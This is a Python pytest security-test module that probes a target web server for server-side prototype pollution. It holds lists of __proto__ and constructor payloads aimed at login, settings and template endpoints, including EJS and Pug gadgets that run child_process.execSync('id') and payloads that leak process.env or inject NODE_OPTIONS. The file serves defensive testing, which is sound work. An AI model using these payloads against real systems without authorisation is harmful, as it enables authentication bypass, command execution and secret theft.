"""
Prototype Pollution Security Tests

Tests for server-side prototype pollution vulnerabilities that can lead to
property injection, authentication bypass, and remote code execution.

References:
- https://portswigger.net/web-security/prototype-pollution
- https://github.com/nicholaschum/prototype-pollution-payloads
"""

import json
import pytest
import requests


# Prototype pollution payloads
PROTOTYPE_POLLUTION_PAYLOADS = [
    # Basic __proto__ pollution
    {"__proto__.admin": "true"},
    {"__proto__.isAdmin": True},
    {"__proto__.role": "admin"},
    {"__proto__.authenticated": True},
    {"__proto__.user": "admin"},
    {"__proto__.verified": True},

    # Nested __proto__ pollution
    {"__proto__": {"admin": "true"}},
    {"__proto__": {"isAdmin": True}},
    {"__proto__": {"role": "admin"}},
    {"__proto__": {"authenticated": True}},

    # Constructor prototype pollution
    {"constructor": {"prototype": {"admin": "true"}}},
    {"constructor": {"prototype": {"isAdmin": True}}},
    {"constructor": {"prototype": {"role": "admin"}}},

    # Deep nested pollution
    {"user": {"__proto__": {"isAdmin": True}}},
    {"data": {"__proto__": {"admin": "true"}}},
    {"config": {"__proto__": {"debug": True}}},
    {"settings": {"__proto__": {"admin": True}}},

    # toString/valueOf override
    {"__proto__": {"toString": "exploit"}},
    {"__proto__": {"valueOf": "1"}},

    # Status/code manipulation
    {"__proto__": {"status": 200}},
    {"__proto__": {"statusCode": 200}},
    {"__proto__": {"code": 0}},

    # Shell/command injection via pollution
    {"__proto__": {"shell": "/bin/sh"}},
    {"__proto__": {"NODE_OPTIONS": "--require /proc/self/environ"}},
    {"__proto__": {"env": {"NODE_OPTIONS": "--inspect"}}},

    # Express/Pug specific
    {"__proto__": {"block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync('id')"}}},
    {"__proto__": {"compileDebug": True}},

    # EJS specific
    {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');s"}},
    {"__proto__": {"client": True}},

    # Lodash merge specific
    {"__proto__": {"sourceURL": "\u000areturn process.env//"}},

    # HTTP header pollution
    {"__proto__": {"headers": {"X-Forwarded-For": "127.0.0.1"}}},
    {"__proto__": {"headers": {"X-Admin": "true"}}},
]

# JSON string payloads (for Content-Type: application/json)
PROTOTYPE_POLLUTION_JSON = [
    '{"__proto__": {"admin": "true"}}',
    '{"__proto__": {"isAdmin": true}}',
    '{"__proto__": {"role": "admin"}}',
    '{"constructor": {"prototype": {"admin": "true"}}}',
    '{"a": {"__proto__": {"admin": true}}}',
    '{"__proto__": {"toString": "polluted"}}',
    '{"__proto__": {"status": 200}}',
]

# Query string payloads
PROTOTYPE_POLLUTION_QUERY = [
    "__proto__[admin]=true",
    "__proto__[isAdmin]=true",
    "__proto__[role]=admin",
    "constructor[prototype][admin]=true",
    "a[__proto__][admin]=true",
    "__proto__.admin=true",
    "__proto__.isAdmin=1",
]

# Detection signatures indicating successful pollution
POLLUTION_SUCCESS_SIGNATURES = [
    "admin",
    "isAdmin",
    '"role":"admin"',
    '"authenticated":true',
    "true",  # Property value echoed
    "polluted",
    "exploit",
]

# Error signatures that may indicate vulnerability
POLLUTION_ERROR_SIGNATURES = [
    "cannot read property",
    "prototype",
    "object.prototype",
    "__proto__",
    "constructor",
    "hasownproperty",
    "type error",
    "undefined is not",
]


class TestPrototypePollution:
    """Tests for prototype pollution vulnerabilities."""

    @pytest.fixture(autouse=True)
    def setup(self, target_url, session):
        self.target_url = target_url
        self.session = session

    @pytest.mark.prototype_pollution
    @pytest.mark.security
    def test_json_body_pollution(self, target_url, session):
        """Test prototype pollution via JSON body."""
        findings = []

        # Try common API endpoints
        endpoints = [
            "/api/user",
            "/api/login",
            "/api/register",
            "/api/update",
            "/api/profile",
            "/api/settings",
            "/api/config",
            "/user",
            "/login",
            "/register",
        ]

        for endpoint in endpoints:
            url = f"{target_url.rstrip('/')}{endpoint}"

            for payload in PROTOTYPE_POLLUTION_PAYLOADS[:15]:  # Test subset
                try:
                    response = session.post(
                        url,
                        json=payload,
                        timeout=10,
                        headers={"Content-Type": "application/json"}
                    )

                    # Check for success indicators
                    response_text = response.text.lower()
                    for sig in POLLUTION_SUCCESS_SIGNATURES:
                        if sig.lower() in response_text:
                            # Verify it's actually pollution, not just echo
                            if "__proto__" not in str(payload).lower() or sig != "true":
                                findings.append({
                                    "endpoint": endpoint,
                                    "payload": str(payload),
                                    "signature": sig,
                                    "status": response.status_code,
                                })
                                break

                    # Check for error signatures
                    for sig in POLLUTION_ERROR_SIGNATURES:
                        if sig in response_text:
                            findings.append({
                                "endpoint": endpoint,
                                "payload": str(payload),
                                "error_signature": sig,
                                "status": response.status_code,
                            })
                            break

                except requests.RequestException:
                    continue

        if findings:
            pytest.fail(
                f"Potential prototype pollution vulnerabilities found: {len(findings)} instances. "
                f"First finding: {findings[0]}"
            )

    @pytest.mark.prototype_pollution
    @pytest.mark.security
    def test_query_param_pollution(self, target_url, session):
        """Test prototype pollution via query parameters."""
        findings = []

        # Try endpoints with query params
        endpoints = ["/", "/api", "/search", "/filter", "/query"]

        for endpoint in endpoints:
            for payload in PROTOTYPE_POLLUTION_QUERY:
                url = f"{target_url.rstrip('/')}{endpoint}?{payload}"

                try:
                    response = session.get(url, timeout=10)
                    response_text = response.text.lower()

                    for sig in POLLUTION_SUCCESS_SIGNATURES:
                        if sig.lower() in response_text:
                            findings.append({
                                "url": url,
                                "payload": payload,
                                "signature": sig,
                            })
                            break

                    for sig in POLLUTION_ERROR_SIGNATURES:
                        if sig in response_text:
                            findings.append({
                                "url": url,
                                "payload": payload,
                                "error_signature": sig,
                            })
                            break

                except requests.RequestException:
                    continue

        if findings:
            pytest.fail(
                f"Query parameter prototype pollution detected: {len(findings)} instances. "
                f"First: {findings[0]}"
            )

    @pytest.mark.prototype_pollution
    @pytest.mark.security
    def test_nested_object_pollution(self, target_url, session):
        """Test pollution through nested object properties."""
        findings = []

        nested_payloads = [
            {"user": {"profile": {"__proto__": {"admin": True}}}},
            {"data": {"settings": {"__proto__": {"role": "admin"}}}},
            {"config": {"options": {"__proto__": {"debug": True}}}},
            {"input": {"value": {"__proto__": {"validated": True}}}},
        ]

        endpoints = ["/api/user", "/api/update", "/api/settings", "/update"]

        for endpoint in endpoints:
            url = f"{target_url.rstrip('/')}{endpoint}"

            for payload in nested_payloads:
                try:
                    response = session.post(
                        url,
                        json=payload,
                        timeout=10,
                        headers={"Content-Type": "application/json"}
                    )

                    response_text = response.text.lower()

                    # Check for pollution indicators
                    if any(sig.lower() in response_text for sig in ["admin", "debug", "validated"]):
                        findings.append({
                            "endpoint": endpoint,
                            "payload": str(payload),
                            "status": response.status_code,
                        })

                except requests.RequestException:
                    continue

        if findings:
            pytest.fail(f"Nested object pollution detected: {findings}")

    @pytest.mark.prototype_pollution
    @pytest.mark.security
    def test_merge_function_pollution(self, target_url, session):
        """Test pollution via merge/extend functions (lodash, jQuery.extend, etc)."""
        findings = []

        # Payloads targeting common merge functions
        merge_payloads = [
            {"__proto__": {"polluted": "yes"}},
            {"constructor": {"prototype": {"polluted": "yes"}}},
            {"__proto__": {"sourceURL": "\nreturn process.env//"}},
        ]

        # PUT/PATCH often use merge
        methods = ["PUT", "PATCH", "POST"]
        endpoints = ["/api/user", "/api/config", "/api/settings", "/merge", "/update"]

        for method in methods:
            for endpoint in endpoints:
                url = f"{target_url.rstrip('/')}{endpoint}"

                for payload in merge_payloads:
                    try:
                        if method == "PUT":
                            response = session.put(url, json=payload, timeout=10)
                        elif method == "PATCH":
                            response = session.patch(url, json=payload, timeout=10)
                        else:
                            response = session.post(url, json=payload, timeout=10)

                        if "polluted" in response.text.lower():
                            findings.append({
                                "method": method,
                                "endpoint": endpoint,
                                "payload": str(payload),
                            })

                    except requests.RequestException:
                        continue

        if findings:
            pytest.fail(f"Merge function pollution detected: {findings}")

    @pytest.mark.prototype_pollution
    @pytest.mark.security
    def test_rce_via_pollution(self, target_url, session):
        """Test for RCE possibilities via prototype pollution."""
        findings = []

        # RCE-focused payloads
        rce_payloads = [
            # EJS template RCE
            {"__proto__": {"outputFunctionName": "x;console.log('polluted');//"}},
            # Pug template RCE
            {"__proto__": {"block": {"type": "Text", "line": "console.log('polluted')"}}},
            # Handlebars RCE
            {"__proto__": {"allowProtoMethodsByDefault": True}},
            {"__proto__": {"allowProtoPropertiesByDefault": True}},
            # Child process
            {"__proto__": {"shell": True, "NODE_OPTIONS": "--inspect"}},
        ]

        endpoints = ["/api/render", "/api/template", "/render", "/template", "/view"]

        for endpoint in endpoints:
            url = f"{target_url.rstrip('/')}{endpoint}"

            for payload in rce_payloads:
                try:
                    response = session.post(url, json=payload, timeout=10)

                    # Check for RCE indicators
                    response_text = response.text.lower()
                    if any(ind in response_text for ind in ["polluted", "uid=", "gid=", "error"]):
                        findings.append({
                            "endpoint": endpoint,
                            "payload": str(payload),
                            "response_snippet": response.text[:200],
                        })

                except requests.RequestException:
                    continue

        if findings:
            pytest.fail(
                f"Potential RCE via prototype pollution: {len(findings)} instances. "
                f"This is CRITICAL - review immediately."
            )

    @pytest.mark.prototype_pollution
    @pytest.mark.security
    def test_auth_bypass_pollution(self, target_url, session):
        """Test authentication bypass via prototype pollution."""
        findings = []

        # Auth bypass payloads
        auth_payloads = [
            {"username": "test", "__proto__": {"isAdmin": True}},
            {"username": "test", "__proto__": {"authenticated": True}},
            {"username": "test", "__proto__": {"role": "admin"}},
            {"username": "test", "constructor": {"prototype": {"isAdmin": True}}},
            {"user": {"__proto__": {"verified": True}}},
        ]

        auth_endpoints = ["/api/login", "/api/auth", "/login", "/auth", "/authenticate"]

        for endpoint in auth_endpoints:
            url = f"{target_url.rstrip('/')}{endpoint}"

            for payload in auth_payloads:
                try:
                    response = session.post(url, json=payload, timeout=10)

                    # Check for successful auth indicators
                    if response.status_code == 200:
                        response_text = response.text.lower()
                        if any(ind in response_text for ind in ["token", "session", "success", "welcome", "logged"]):
                            findings.append({
                                "endpoint": endpoint,
                                "payload": str(payload),
                                "status": response.status_code,
                            })

                except requests.RequestException:
                    continue

        if findings:
            pytest.fail(f"Authentication bypass via pollution detected: {findings}")
